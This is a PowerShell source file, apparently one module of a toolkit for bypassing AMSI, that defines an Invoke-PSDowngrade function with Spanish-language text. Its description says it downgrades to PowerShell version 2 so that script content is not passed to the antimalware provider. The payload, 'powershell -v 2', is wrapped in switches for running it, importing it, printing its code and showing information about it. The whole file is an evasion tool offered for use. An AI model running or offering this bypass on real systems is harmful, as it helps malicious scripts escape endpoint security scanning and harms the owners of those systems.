function Invoke-PSDowngrade{

    [CmdletBinding()]
    Param(
        [string] $Get,
        [switch] $Run,
        [switch] $Import,
        [switch] $Info,
        [switch] $Code
    )
    
    $Bypass = New-Object -TypeName PSObject
    $Name = "Downgrade de PowerShell"
    $Description = "Este bypass consiste en usar la versión 2 de PowerShell, la cual no es compatible con AMSI, de tal forma que el contenido no es enviado al proveedor antimalware"
    $Script = {powershell -v 2}


    $Bypass | Add-Member -MemberType NoteProperty -Name "Name" -Value $Name
    $Bypass | Add-Member -MemberType NoteProperty -Name "Description" -Value $Description
    $Bypass | Add-Member -MemberType NoteProperty -Name "Script" -Value $Script
    $Bypass | Add-Member -MemberType ScriptMethod -Name RunScript -Value {& $Bypass.Script}


    if($Run){
        Write-Host "Ejecutando $Name..." -ForegroundColor Green
        Start-Sleep 1
        $Bypass.RunScript()
        Write-Host "$Name completado!" -ForegroundColor Green
        return
    }

    if($Import){
        return $Bypass
    }

    if($Get.Length -ne 0)
    {
        if($Get -eq "All"){
            $Bypass.PSObject.Properties | ForEach-Object{

                $name = $_.Name 
                $value = $_.value
                Write-Host "`n${name}: `n$value`n"
                

            }
        }else{
            Write-Output $Bypass | Select-Object -Property $Get
        }
        return
    }


    if($Info){
        Write-Host $Name -ForegroundColor DarkGreen
        Write-Host $("=" * $Name.Length) -ForegroundColor Yellow
        Write-Host $Description -ForegroundColor Blue
    }


    if($Code){
        Write-Host $Script -ForegroundColor Cyan
    }



}